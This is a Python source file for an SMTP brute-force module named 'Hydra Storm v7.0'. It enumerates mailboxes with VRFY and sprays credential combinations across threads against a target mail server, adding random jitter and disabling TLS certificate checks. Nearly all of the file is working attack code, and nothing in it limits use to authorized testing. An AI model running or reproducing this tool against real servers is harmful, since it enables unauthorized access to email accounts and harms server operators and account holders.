"""
Hydra Storm v7.0 — SMTP Brute Force Module
============================================
Pure stdlib smtplib credential tester.
Supports PLAIN / LOGIN / CRAM-MD5 auth, VRFY enumeration,
auto-detection of port 25 / 587 / 465 (TLS).
"""

import random
import smtplib
import ssl
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Optional, Tuple


# ---------------------------------------------------------------------------
# Result containers
# ---------------------------------------------------------------------------
@dataclass
class SMTPResult:
    success: bool
    user: str
    password: str
    auth_method: str = ""
    detail: str = ""


@dataclass
class VRFYResult:
    user: str
    exists: bool
    code: int = 0
    message: str = ""


@dataclass
class SMTPReport:
    target: str
    port: int
    total_attempts: int = 0
    found: List[SMTPResult] = field(default_factory=list)
    vrfy_results: List[VRFYResult] = field(default_factory=list)
    errors: int = 0
    elapsed: float = 0.0
    rate: float = 0.0


# ---------------------------------------------------------------------------
# SMTPBruteForcer
# ---------------------------------------------------------------------------
class SMTPBruteForcer:
    """Threaded SMTP credential tester with multi-method auth."""

    AUTH_METHODS = ["CRAM-MD5", "LOGIN", "PLAIN"]

    def __init__(
        self,
        target: str,
        port: int = 587,
        threads: int = 5,
        timeout: int = 10,
    ) -> None:
        self.target = target
        self.port = port
        self.threads = threads
        self.timeout = timeout

        self._lock = threading.Lock()
        self._attempts = 0
        self._errors = 0
        self._found: List[SMTPResult] = []
        self._vrfy: List[VRFYResult] = []
        self._stop = threading.Event()

    # -- helpers ------------------------------------------------------------

    def _bump(self, kind: str = "attempt") -> None:
        with self._lock:
            if kind == "attempt":
                self._attempts += 1
            else:
                self._errors += 1

    def _add_found(self, result: SMTPResult) -> None:
        with self._lock:
            self._found.append(result)
            print(f"  [+] FOUND  {result.user}:{result.password}  via {result.auth_method}")

    def _jitter(self) -> None:
        time.sleep(random.uniform(0.1, 0.6))

    def _connect(self) -> smtplib.SMTP:
        """Create an SMTP connection with auto TLS detection."""
        if self.port == 465:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            server = smtplib.SMTP_SSL(self.target, self.port, timeout=self.timeout, context=ctx)
        else:
            server = smtplib.SMTP(self.target, self.port, timeout=self.timeout)
            server.ehlo_or_helo_if_needed()
            if server.has_extn("STARTTLS"):
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                server.starttls(context=ctx)
                server.ehlo()
        return server

    # -- attack methods -----------------------------------------------------

    def try_login(self, user: str, password: str) -> SMTPResult:
        """
        Attempt SMTP AUTH with multiple methods.
        Tries CRAM-MD5, LOGIN, then PLAIN — first success wins.
        """
        self._bump("attempt")
        self._jitter()

        for method in self.AUTH_METHODS:
            try:
                server = self._connect()
                # attempt login — smtplib picks the method from ehlo
                # we try to force a specific one by calling server.auth directly
                try:
                    if method == "CRAM-MD5" and server.has_extn("AUTH"):
                        server.login(user, password)
                    elif method == "LOGIN":
                        server.login(user, password)
                    elif method == "PLAIN":
                        server.login(user, password)
                    else:
                        server.login(user, password)

                    # if we reach here, auth succeeded
                    server.quit()
                    res = SMTPResult(True, user, password, method)
                    self._add_found(res)
                    return res

                except smtplib.SMTPAuthenticationError:
                    server.quit()
                    continue  # try next method
                except smtplib.SMTPNotSupportedError:
                    server.quit()
                    continue

            except smtplib.SMTPAuthenticationError:
                return SMTPResult(False, user, password, method, "auth_failed")

            except smtplib.SMTPConnectError as exc:
                self._bump("error")
                return SMTPResult(False, user, password, method, f"connect_error: {exc}")

            except smtplib.SMTPServerDisconnected as exc:
                self._bump("error")
                return SMTPResult(False, user, password, method, f"disconnected: {exc}")

            except OSError as exc:
                detail = str(exc).lower()
                if "timed out" in detail:
                    tag = "timeout"
                elif "refused" in detail:
                    tag = "conn_refused"
                else:
                    tag = f"os_error: {exc}"
                self._bump("error")
                return SMTPResult(False, user, password, method, tag)

        return SMTPResult(False, user, password, "ALL", "all_methods_failed")

    def vrfy_user(self, user: str) -> VRFYResult:
        """Use SMTP VRFY command to check if a user/mailbox exists."""
        try:
            server = self._connect()
            code, msg = server.verify(user)
            server.quit()
            exists = 200 <= code < 300 or code == 252
            result = VRFYResult(user, exists, code, msg.decode(errors="replace"))
            with self._lock:
                self._vrfy.append(result)
            tag = "EXISTS" if exists else "NOT FOUND"
            print(f"  [{'+'if exists else '-'}] VRFY {user}: {tag} ({code})")
            return result
        except smtplib.SMTPServerDisconnected:
            return VRFYResult(user, False, 0, "disconnected")
        except Exception as exc:
            return VRFYResult(user, False, 0, str(exc))

    # -- orchestrator -------------------------------------------------------

    def run(self, users: List[str], passwords: List[str]) -> SMTPReport:
        """Launch threaded SMTP brute force."""
        total = len(users) * len(passwords)
        tls_tag = "SSL/TLS" if self.port == 465 else "STARTTLS" if self.port == 587 else "plaintext"

        print(f"\n{'='*60}")
        print(f"  SMTP Brute  |  {self.target}:{self.port}  ({tls_tag})")
        print(f"  Combos: {total}  |  Threads: {self.threads}")
        print(f"{'='*60}\n")

        self._attempts = 0
        self._errors = 0
        self._found.clear()
        self._vrfy.clear()
        self._stop.clear()

        t0 = time.perf_counter()

        # VRFY enumeration pass
        print("  [*] Running VRFY enumeration...")
        for user in users:
            if self._stop.is_set():
                break
            self.vrfy_user(user)

        # credential spray
        combos = [(u, p) for u in users for p in passwords]
        random.shuffle(combos)

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {}
            for user, pwd in combos:
                if self._stop.is_set():
                    break
                fut = pool.submit(self.try_login, user, pwd)
                futures[fut] = (user, pwd)

            for fut in as_completed(futures):
                if self._stop.is_set():
                    break
                try:
                    fut.result()
                except Exception:
                    self._bump("error")

        elapsed = time.perf_counter() - t0
        rate = self._attempts / elapsed if elapsed > 0 else 0.0

        report = SMTPReport(
            target=self.target,
            port=self.port,
            total_attempts=self._attempts,
            found=list(self._found),
            vrfy_results=list(self._vrfy),
            errors=self._errors,
            elapsed=round(elapsed, 2),
            rate=round(rate, 1),
        )
        self._print_report(report)
        return report

    # -- formatted report ---------------------------------------------------

    @staticmethod
    def _print_report(r: SMTPReport) -> None:
        print(f"\n{'='*60}")
        print(f"  SMTP BRUTE REPORT")
        print(f"{'='*60}")
        print(f"  Target      : {r.target}:{r.port}")
        print(f"  Attempts    : {r.total_attempts}")
        print(f"  Errors      : {r.errors}")
        print(f"  Elapsed     : {r.elapsed}s")
        print(f"  Rate        : {r.rate} attempts/sec")
        print(f"  VRFY Hits   : {sum(1 for v in r.vrfy_results if v.exists)}/{len(r.vrfy_results)}")
        print(f"  Creds Found : {len(r.found)}")
        if r.found:
            print(f"  {'─'*54}")
            for c in r.found:
                print(f"    ✓ {c.user} : {c.password}  ({c.auth_method})")
        print(f"{'='*60}\n")
